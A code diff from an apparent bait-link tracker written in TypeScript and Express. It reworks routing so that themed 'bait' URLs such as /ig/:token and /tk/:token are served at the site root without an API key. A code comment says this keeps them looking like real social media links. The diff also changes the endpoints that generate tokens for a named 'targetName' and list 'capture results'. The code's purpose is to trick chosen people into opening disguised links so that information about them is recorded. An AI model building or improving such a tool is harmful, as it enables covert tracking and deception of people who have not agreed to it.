@@ -345,24 +345,26 @@ async function handleBaitRoute(
   saveStore();
 }
 
-// ── Routes ───────────────────────────────────────────────────────────────────
-const router = Router();
+// ── Bait router — mounted at ROOT "/" (no API key required) ─────────────────
+// Keeps URLs looking like real social media links: /ig/:token, /tk/:token etc.
+export const baitRouter = Router();
 
-// Register all themed bait routes
 for (const [key, cfg] of Object.entries(THEMES) as [BaitTheme, ThemeConfig][]) {
-  if (key === "plain") continue; // handled separately as /v/:token
-  router.get(`/${cfg.route}/:token`, (req, res) => {
+  if (key === "plain") continue;
+  baitRouter.get(`/${cfg.route}/:token`, (req, res) => {
     void handleBaitRoute(req, res, key);
   });
 }
-
 // Legacy plain route
-router.get("/v/:token", (req, res) => {
+baitRouter.get("/v/:token", (req, res) => {
   void handleBaitRoute(req, res, "plain");
 });
 
+// ── API router — mounted at "/api" (through normal router chain) ─────────────
+const router = Router();
+
 // Generate a new tracking token with optional theme
-router.post("/api/tracker/gen", (req, res) => {
+router.post("/tracker/gen", (req, res) => {
   const { userId, username, targetName, theme } = (req.body ?? {}) as {
     userId?: string; username?: string; targetName?: string; theme?: BaitTheme;
   };
@@ -390,14 +392,14 @@ router.post("/api/tracker/gen", (req, res) => {
 });
 
 // Get capture result for a token
-router.get("/api/tracker/:token", (req, res) => {
+router.get("/tracker/:token", (req, res) => {
   const entry = store.get(req.params.token);
   if (!entry) { res.status(404).json({ error: "token not found" }); return; }
   res.json(entry);
 });
 
 // List all entries
-router.get("/api/tracker", (_req, res) => {
+router.get("/tracker", (_req, res) => {
   res.json(listAllEntries().slice(0, 100));
 });
 
